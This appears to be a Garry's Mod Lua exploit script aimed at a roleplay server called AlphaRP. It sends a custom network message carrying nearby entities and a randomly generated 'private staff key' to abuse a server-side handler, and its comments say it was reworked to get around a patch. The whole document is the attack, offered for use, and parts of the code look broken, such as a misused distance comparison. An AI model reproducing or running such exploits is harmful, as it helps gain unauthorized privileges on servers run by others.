function GenKey()
return string.char(math.random(97, 122))..math.random(0,9)..string.char(math.random(97, 122))..math.random(0,9).."-"..string.char(math.random(97, 122))..math.random(0,9)..string.char(math.random(97, 122))..math.random(0,9).."-"..string.char(math.random(97, 122))..math.random(0,9)..string.char(math.random(97, 122))..math.random(0,9)
end	
net.Start("AhgAjoadgk")
--checks for aim target
for k,v in pairs(ents.FindByClass("wd_ab_t") do
if not LocalPlayer():Distance(v:GetPos()) < 25 then return end
 net.WriteEntity(v)
end
 net.WriteBit(14)
 --generates private staff key
 net.WriteString(GenKey())
net.SendToServer()
print("fixed by github.com/ANrmlHuman/")
--this was fixed from the patch
--this was found by grabbing all of the nets on AlphaRP
